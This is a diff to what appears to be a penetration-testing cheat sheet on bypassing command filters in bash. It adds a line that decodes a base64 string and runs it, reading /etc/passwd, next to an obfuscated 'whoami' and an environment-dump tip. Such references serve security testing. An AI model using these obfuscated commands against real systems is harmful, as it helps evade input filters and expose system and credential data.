@@ -37,6 +37,7 @@ $(tr "[0-9]" "\0"<<<"who420ami") # whoami
 ```bash
 print # instead of echo
 printenv # print all env variables
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) # run b64 command 
 ```
 
 <hr>
